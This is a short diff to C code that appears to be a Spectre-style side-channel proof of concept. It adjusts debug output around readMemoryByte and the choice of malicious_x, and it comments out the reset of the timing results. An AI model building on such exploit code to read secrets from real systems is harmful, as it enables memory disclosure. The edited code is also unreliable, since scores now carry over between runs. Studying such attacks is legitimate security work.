@@ -64,7 +64,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
 
   for (i = 0; i < 256; i++) {
       printf("try %d", i);
-      results[i] = 0;
+      //results[i] = 0;
   }
     
   for (tries = 999; tries > 0; tries--) {
@@ -157,14 +157,13 @@ int main(int argc, const char * * argv) {
   //Find the address that corresponds to secret[0] in terms of its modulu
   for (i = 0; i < sizeof(bigArray); i++) {
       addr = &bigArray[i];
-      printf("current is %lu in iteration %d\n", (uint64_t)(addr) % 4096, i);
       if ((uint64_t)(addr) % 4096 == addressOfStartOfSecretModulo) {
           malicious_x = i; //This is the location that we need in bigArray
           break;
       }
   }
   bigArray[malicious_x] = 'A';
-     
+  printf("Malicious x is %d", malicious_x);
   while (--len >= 0) {
     printf("iteration %d \n", len);
     readMemoryByte(malicious_x, value, score);
